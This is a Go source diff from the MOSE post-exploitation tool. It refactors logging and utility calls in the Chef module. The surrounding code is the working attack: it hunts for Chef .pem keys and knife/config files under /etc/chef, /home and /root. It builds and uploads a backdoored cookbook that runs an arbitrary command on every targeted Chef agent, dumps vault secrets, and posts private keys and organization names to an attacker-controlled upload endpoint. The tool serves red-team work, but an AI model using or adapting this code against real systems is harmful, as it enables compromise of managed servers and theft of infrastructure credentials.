@@ -10,9 +10,7 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"flag"
-	"fmt"
 	"io"
-	"log"
 	"mime/multipart"
 	"net/http"
 	"os"
@@ -23,10 +21,13 @@ import (
 	"text/template"
 	"time"
 
-	utils "github.com/l50/goutils"
-	"github.com/markbates/pkger"
 	"github.com/master-of-servers/mose/pkg/chefutils"
 	"github.com/master-of-servers/mose/pkg/moseutils"
+	system "github.com/master-of-servers/mose/pkg/system"
+
+	"github.com/markbates/pkger"
+	"github.com/rs/zerolog"
+	"github.com/rs/zerolog/log"
 )
 
 // Command holds information used to run commands on a target chef system
@@ -83,7 +84,7 @@ func runKnifeCmd(cmd string, err error) ([]string, error) {
 // to the run_list for a specified set of nodes
 func setRunLists(nodes []string, knifeFile string) {
 	for _, node := range nodes {
-		_, err := runKnifeCmd(utils.RunCommand(knifeFile, "node", "run_list", "add", node, "recipe["+cookbookName+"]"))
+		_, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "run_list", "add", node, "recipe["+cookbookName+"]"))
 		if err != nil {
 			log.Printf("ERROR: Unable to add the %v cookbook to the run_list for %s: %v", cookbookName, node, err)
 		}
@@ -114,7 +115,7 @@ func createMetadata(absCookbookPath string) bool {
 	s, err := pkger.Open(filepath.Join("/", "tmpl", "metadata.rb.tmpl"))
 
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 	defer s.Close()
 
@@ -122,23 +123,23 @@ func createMetadata(absCookbookPath string) bool {
 	_, err = io.Copy(dat, s)
 
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	t, err := template.New("metadata").Parse(dat.String())
 
 	if err != nil {
-		log.Fatal("Parse: ", err)
+		log.Fatal().Err(err).Msg("Parse: ")
 	}
 
 	f, err := os.Create(filepath.Join(absCookbookPath, "metadata.rb"))
 
 	if err != nil {
-		log.Fatalln(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	if err = t.Execute(f, metadataCommand); err != nil {
-		log.Fatal("Execute: ", err)
+		log.Fatal().Err(err).Msg("Execute: ")
 	}
 
 	f.Close()
@@ -160,7 +161,7 @@ func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 	}
 
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 	defer s.Close()
 
@@ -168,17 +169,17 @@ func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 	_, err = io.Copy(dat, s)
 
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	t, err := template.New("chefCookbook").Parse(dat.String())
 
 	if err != nil {
-		log.Fatal("Parse: ", err)
+		log.Fatal().Err(err).Msg("Parse: ")
 	}
 	evilCookbook := []string{filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes")}
-	if moseutils.CreateFolders(evilCookbook) {
-		moseutils.Msg("Successfully created the %s cookbook at %s", cookbookName, filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes"))
+	if system.CreateFolders(evilCookbook) {
+		log.Log().Msgf("Successfully created the %s cookbook at %s", cookbookName, filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes"))
 	}
 
 	absCookbookPath := filepath.Join(cookbooksLoc, "/", cookbookName)
@@ -186,16 +187,16 @@ func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 	f, err := os.Create(filepath.Join(absCookbookPath, "/recipes", "default.rb"))
 
 	if err != nil {
-		log.Fatalln(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	_, err = moseutils.TrackChanges(cleanupFile, absCookbookPath)
 	if err != nil {
-		log.Println("Error tracking changes: ", err)
+		log.Error().Err(err).Msg("Error tracking changes: ")
 	}
 
 	if err = t.Execute(f, chefCommand); err != nil {
-		log.Fatal("Execute: ", err)
+		log.Fatal().Err(err).Msg("Execute: ")
 	}
 
 	f.Close()
@@ -203,22 +204,22 @@ func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 	// Logic for copying a file to the files directory
 	filesLoc := filepath.Join(cookbooksLoc, cookbookName, "files")
 	if uploadFileName != "" {
-		if moseutils.CreateFolders([]string{filepath.Join(cookbooksLoc, cookbookName, "files/default")}) {
-			moseutils.Msg("Successfully created files directory at location %s for file %s", filesLoc, uploadFileName)
+		if system.CreateFolders([]string{filepath.Join(cookbooksLoc, cookbookName, "files/default")}) {
+			log.Log().Msgf("Successfully created files directory at location %s for file %s", filesLoc, uploadFileName)
 
 			// Maybe assume it isn't in current directory?
-			_ = moseutils.CpFile(uploadFileName, filepath.Join(filesLoc, filepath.Base(uploadFileName)))
+			_ = system.CpFile(uploadFileName, filepath.Join(filesLoc, filepath.Base(uploadFileName)))
 
 			_, err = moseutils.TrackChanges(cleanupFile, uploadFilePath)
 
 			if err != nil {
-				log.Println("Error tracking changes: ", err)
+				log.Error().Err(err).Msg("Error tracking changes: ")
 			}
 
 			if err := os.Chmod(filepath.Join(filesLoc, filepath.Base(uploadFileName)), 0644); err != nil {
-				log.Fatal(err)
+				log.Fatal().Err(err).Msg("")
 			}
-			moseutils.Msg("Successfully copied and set permissions for %s", filepath.Join(filesLoc, filepath.Base(uploadFileName)))
+			log.Log().Msgf("Successfully copied and set permissions for %s", filepath.Join(filesLoc, filepath.Base(uploadFileName)))
 		}
 	}
 
@@ -243,7 +244,7 @@ func extractKeys(config string) []string {
 	// Read file line-by-line
 	file, err := os.Open(config)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 	defer file.Close()
 
@@ -257,11 +258,11 @@ func extractKeys(config string) []string {
 	}
 
 	if err := scanner.Err(); err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	if len(chefKeys) == 0 {
-		log.Fatalln("No keys found, exiting.")
+		log.Fatal().Err(err).Msg("No keys found, exiting.")
 	}
 	return chefKeys
 }
@@ -281,7 +282,7 @@ func newFileUploadRequest(uri string, params map[string]string, paramName, path 
 		return nil, err
 	}
 	if _, err = io.Copy(part, file); err != nil {
-		log.Fatalln(err)
+		log.Fatal().Err(err).Msg("")
 	}
 
 	for key, val := range params {
@@ -309,7 +310,7 @@ func transferJSON(jBytes []byte, endpoint string) {
 	req, err := http.NewRequest("POST", attacker, bytes.NewBuffer(jBytes))
 	req.Header.Set("Content-Type", "application/json")
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 	client := &http.Client{}
 	if serveSSL {
@@ -326,7 +327,7 @@ func transferJSON(jBytes []byte, endpoint string) {
 		resp, err := client.Do(req)
 		if err != nil {
 			if i == 4 {
-				log.Fatal("Failure to send any responses, check host for issues")
+				log.Fatal().Err(err).Msg("Failure to send any responses, check host for issues")
 			}
 			log.Printf("Failure to send request. Retrying %d", i+1)
 			time.Sleep(3 * time.Second)
@@ -346,7 +347,7 @@ func transferKey(key string) {
 	attacker := proto + localIP + ":" + strconv.Itoa(exfilPort) + "/upload"
 	request, err := newFileUploadRequest(attacker, nil, "file", key)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	}
 	client := &http.Client{}
 	if serveSSL {
@@ -361,55 +362,55 @@ func transferKey(key string) {
 	}
 	resp, err := client.Do(request)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal().Err(err).Msg("")
 	} else {
 		body := &bytes.Buffer{}
 		_, err := body.ReadFrom(resp.Body)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatal().Err(err).Msg("")
 		}
 		resp.Body.Close()
-		moseutils.Info("Exfilling %v, please wait...", key)
+		log.Info().Msgf("Exfilling %v, please wait...", key)
 	}
 }
 
 func findSecrets(knifeFile string) {
-	vaults, err := runKnifeCmd(utils.RunCommand(knifeFile, "vault", "list"))
+	vaults, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "list"))
 	if err != nil {
-		log.Println("Error while getting the vault list: ", err)
+		log.Error().Err(err).Msg("Error while getting the vault list")
 	}
 	for _, vault := range vaults {
-		secrets, err := runKnifeCmd(utils.RunCommand(knifeFile, "vault", "show", vault))
+		secrets, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "show", vault))
 		if err != nil {
-			log.Printf("Error retrieving secrets from %s: %v", vault, err)
+			log.Error().Err(err).Msgf("Error retrieving secrets from %s", vault)
 		}
 		for _, secret := range secrets {
-			output, err := runKnifeCmd(utils.RunCommand(knifeFile, "vault", "show", vault, secret))
+			output, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "show", vault, secret))
 			if err != nil {
 				log.Printf("Error retrieving %s from the %s vault: %v", secret, vault, err)
 			}
-			moseutils.Msg(strings.Join(output, " "))
+			log.Log().Msgf(strings.Join(output, " "))
 		}
 	}
 }
 
 func chefWorkstation(knifeFile string, chefDirs []string) {
-	moseutils.Info("Knife binary detected, attempting to get existing nodes and cookbooks...")
-	nodes, err := runKnifeCmd(utils.RunCommand(knifeFile, "node", "list"))
+	log.Info().Msg("Knife binary detected, attempting to get existing nodes and cookbooks...")
+	nodes, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "list"))
 	if inspect {
 		log.Printf("BEGIN NODE LIST %v END NODE LIST", nodes)
 	}
 	if err == nil {
-		moseutils.Info("We appear to be on a chef workstation")
-		moseutils.Msg("The following nodes were identified: %v", nodes)
-		cookbooks, err := runKnifeCmd(utils.RunCommand(knifeFile, "cookbook", "list"))
+		log.Info().Msg("We appear to be on a chef workstation")
+		log.Log().Msgf("The following nodes were identified: %v", nodes)
+		cookbooks, err := runKnifeCmd(system.RunCommand(knifeFile, "cookbook", "list"))
 		if err != nil {
-			log.Fatalf("Error while trying to get cookbooks: %s", err)
+			log.Fatal().Err(err).Msgf("Error while trying to get cookbooks: %s", err)
 		}
 		cookbooksNoVersions := removeCookbookVersions(cookbooks)
-		moseutils.Msg("The following cookbooks were identified: %v", cookbooksNoVersions)
+		log.Log().Msgf("The following cookbooks were identified: %v", cookbooksNoVersions)
 		if inspect {
-			log.Printf("Passive mode enabled, exiting.")
+			log.Log().Msg("Passive mode enabled, exiting.")
 			os.Exit(0)
 		}
 		var agents []string
@@ -418,21 +419,21 @@ func chefWorkstation(knifeFile string, chefDirs []string) {
 		} else {
 			agents, err = chefutils.TargetAgents(nodes, osTarget)
 			if err != nil {
-				log.Fatal("Quitting")
+				log.Fatal().Err(err).Msg("Quitting")
 			}
 		}
 		if agents[0] != "MOSEALL" {
 			nodes = agents
 			if uploadFileName != "" {
-				moseutils.Info("Creating a cookbook to run this file: %s on the following Chef agents: %v, please wait...", uploadFileName, nodes)
+				log.Info().Msgf("Creating a cookbook to run this file: %s on the following Chef agents: %v, please wait...", uploadFileName, nodes)
 			} else {
-				moseutils.Info("Creating a cookbook to run this command: %s on the following Chef agents: %v, please wait...", cmd, nodes)
+				log.Info().Msgf("Creating a cookbook to run this command: %s on the following Chef agents: %v, please wait...", cmd, nodes)
 			}
 		} else {
 			if uploadFileName != "" {
-				moseutils.Info("Creating a cookbook to run this file: %s on all Chef agents, please wait...", uploadFileName)
+				log.Info().Msgf("Creating a cookbook to run this file: %s on all Chef agents, please wait...", uploadFileName)
 			} else {
-				moseutils.Info("Creating a cookbook to run this command: %s on all Chef agents, please wait...", cmd)
+				log.Info().Msgf("Creating a cookbook to run this command: %s on all Chef agents, please wait...", cmd)
 			}
 		}
 		var cookbooksLoc string
@@ -442,53 +443,53 @@ func chefWorkstation(knifeFile string, chefDirs []string) {
 			}
 		}
 		createCookbook(cookbooksLoc, cookbookName, cmd)
-		fmt.Println("Moving to the recipes dir in order to upload the cookbook.")
-		moseutils.Cd(cookbooksLoc)
-		moseutils.Info("Uploading the cookbook we've created to the chef server, please wait...")
-		_, err = runKnifeCmd(utils.RunCommand(knifeFile, "upload", cookbookName))
+		log.Log().Msg("Moving to the recipes dir in order to upload the cookbook.")
+		system.Cd(cookbooksLoc)
+		log.Info().Msg("Uploading the cookbook we've created to the chef server, please wait...")
+		_, err = runKnifeCmd(system.RunCommand(knifeFile, "upload", cookbookName))
 		if err != nil {
-			log.Fatalf("Error while trying to upload backdoored cookbook: %s using the following command: %v", err, knifeFile+" upload "+cookbookName)
+			log.Fatal().Err(err).Msgf("Error while trying to upload backdoored cookbook: %s using the following command: %v", err, knifeFile+" upload "+cookbookName)
 		}
 		if agents[0] != "MOSEALL" {
 			nodes = agents
 
 			if uploadFileName != "" {
-				moseutils.Info("Adding a cookbook to run this file: %s to the run_list for the following Chef agents: %v, please wait...", uploadFileName, nodes)
+				log.Info().Msgf("Adding a cookbook to run this file: %s to the run_list for the following Chef agents: %v, please wait...", uploadFileName, nodes)
 			} else {
-				moseutils.Info("Adding a cookbook that will run this command: %s to the run_list for the following Chef agents: %v, please wait...", cmd, nodes)
+				log.Info().Msgf("Adding a cookbook that will run this command: %s to the run_list for the following Chef agents: %v, please wait...", cmd, nodes)
 			}
 		} else {
 			if uploadFileName != "" {
-				moseutils.Info("Adding a cookbook to run this file: %s to the run_list for all Chef agents, please wait...", uploadFileName)
+				log.Info().Msgf("Adding a cookbook to run this file: %s to the run_list for all Chef agents, please wait...", uploadFileName)
 			} else {
-				moseutils.Info("Adding a cookbook that run will run this command: %s to the run_list for all Chef agents, please wait...", cmd)
+				log.Info().Msgf("Adding a cookbook that run will run this command: %s to the run_list for all Chef agents, please wait...", cmd)
 			}
 		}
 		setRunLists(nodes, knifeFile)
-		moseutils.Info("Attempting to find secrets, please wait...")
+		log.Info().Msgf("Attempting to find secrets, please wait...")
 		findSecrets(knifeFile)
-		moseutils.Msg("MOSE has finished, exiting.")
+		log.Log().Msg("MOSE has finished, exiting.")
 		os.Exit(0)
 	}
 }
 
 func chefServer(chefServerFile string, chefFiles []string) {
-	moseutils.Msg("Chef Server detected")
-	moseutils.Info("Using %v to find organizations, please wait...", chefServerFile)
-	organizations, err := utils.RunCommand(chefServerFile, "org-list")
+	log.Log().Msg("Chef Server detected")
+	log.Info().Msgf("Using %v to find organizations, please wait...", chefServerFile)
+	organizations, err := system.RunCommand(chefServerFile, "org-list")
 	if err != nil {
-		log.Fatalln("ERROR: Unable to get organizations")
+		log.Fatal().Err(err).Msg("ERROR: Unable to get organizations")
 	}
 	type Org struct {
 		Name string
 	}
 	jBytes, _ := json.Marshal(Org{Name: organizations})
-	moseutils.Info("Exfilling organization name %v...", organizations)
+	log.Info().Msgf("Exfilling organization name %v...", organizations)
 	transferJSON(jBytes, "org")
 	config := locateConfig(chefFiles)
 	// If a config.rb or knife.rb exists, use it to locate the keys
 	if config != "" {
-		moseutils.Msg("Located config files at %v", config)
+		log.Log().Msgf("Located config files at %v", config)
 		keys = extractKeys(config)
 		for _, key := range keys {
 			transferKey(key)
@@ -499,7 +500,7 @@ func chefServer(chefServerFile string, chefFiles []string) {
 				transferKey(file)
 			}
 		}
-		moseutils.Msg("Finished exfiltrating keys, move to the docker container being spawned on the attacker's system to continue post exploitation operations.")
+		log.Log().Msg("Finished exfiltrating keys, move to the docker container being spawned on the attacker's system to continue post exploitation operations.")
 		os.Exit(0)
 	}
 }
@@ -510,49 +511,54 @@ func cleanupChef(knifeFile string) {
 	_, err := moseutils.TrackChanges(cleanupFile, cleanupFile)
 
 	if err != nil {
-		log.Println("Error tracking changes: ", err)
+		log.Error().Err(err).Msg("Error tracking changes: ")
 	}
 
-	nodes, _ := runKnifeCmd(utils.RunCommand(knifeFile, "node", "list"))
+	nodes, _ := runKnifeCmd(system.RunCommand(knifeFile, "node", "list"))
 	for _, node := range nodes {
-		moseutils.Info("Removing %s from the run_list on %s", cookbookName, node)
-		_, err := runKnifeCmd(utils.RunCommand(knifeFile, "node", "run_list", "remove", node, "recipe["+cookbookName+"]"))
+		log.Info().Msgf("Removing %s from the run_list on %s", cookbookName, node)
+		_, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "run_list", "remove", node, "recipe["+cookbookName+"]"))
 		if err != nil {
-			moseutils.ErrMsg("Error deleting the %s cookbook from %s", cookbookName, node)
+			log.Error().Err(err).Msgf("Error deleting the %s cookbook from %s", cookbookName, node)
 		}
 	}
-	_, err = runKnifeCmd(utils.RunCommand(knifeFile, "cookbook", "delete", "-y", cookbookName))
+	_, err = runKnifeCmd(system.RunCommand(knifeFile, "cookbook", "delete", "-y", cookbookName))
 	if err != nil {
-		log.Printf("Error deleting the %s cookbook from the chef server", cookbookName)
+		log.Log().Msgf("Error deleting the %s cookbook from the chef server", cookbookName)
 	}
 
 	ans, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
 	if err != nil {
-		log.Fatal("Quitting...")
+		log.Fatal().Err(err).Msg("Quitting...")
 	}
 	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
 	os.Exit(0)
 }
 
 func main() {
+	zerolog.SetGlobalLevel(zerolog.InfoLevel)
+	if debug {
+		zerolog.SetGlobalLevel(zerolog.DebugLevel)
+	}
+	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
 	flag.Parse()
 	// If we're not root, we probably can't backdoor any of the chef code, so exit
-	utils.CheckRoot()
+	system.CheckRoot()
 
-	chefFiles, chefDirs := moseutils.FindFiles([]string{"/etc/chef", "/home", "/root"}, []string{".pem"}, []string{"config.rb", "knife.rb"}, []string{`\/cookbooks$`})
+	chefFiles, chefDirs := system.FindFiles([]string{"/etc/chef", "/home", "/root"}, []string{".pem"}, []string{"config.rb", "knife.rb"}, []string{`\/cookbooks$`})
 
 	if len(chefFiles) == 0 {
-		log.Fatalln("Unable to find any chef files, exiting.")
+		log.Fatal().Msg("Unable to find any chef files, exiting.")
 	}
 	if len(chefDirs) == 0 {
-		moseutils.ErrMsg("Unable to find the cookbooks directory.")
+		log.Error().Msg("Unable to find the cookbooks directory.")
 	}
 	if suppliedFilename != "" && uploadFileName != "" {
-		log.Printf("The suppliedFilename (%s) flag is set, assigning to uploadFilename (%s).", suppliedFilename, uploadFileName)
+		log.Log().Msgf("The suppliedFilename (%s) flag is set, assigning to uploadFilename (%s).", suppliedFilename, uploadFileName)
 		uploadFileName = suppliedFilename
 	}
 	// check if knife binary exists on server
-	found, knifeFile := moseutils.FindFile("knife", []string{"/bin", "/home", "/opt", "/root"})
+	found, knifeFile := system.FindFile("knife", []string{"/bin", "/home", "/opt", "/root"})
 
 	if found {
 		if cleanup {
@@ -561,11 +567,11 @@ func main() {
 		chefWorkstation(knifeFile, chefDirs)
 	}
 
-	moseutils.Info("Determining if we are on a chef server or an invalid target, please wait...")
-	found, chefServerFile := moseutils.FindFile("chef-server-ctl", []string{"/bin", "/home", "/opt", "/root"})
+	log.Info().Msg("Determining if we are on a chef server or an invalid target, please wait...")
+	found, chefServerFile := system.FindFile("chef-server-ctl", []string{"/bin", "/home", "/opt", "/root"})
 	if found {
 		chefServer(chefServerFile, chefFiles)
 	}
-	moseutils.ErrMsg("We are on an invalid target, exiting...")
+	log.Error().Msg("We are on an invalid target, exiting...")
 	os.Exit(1)
 }
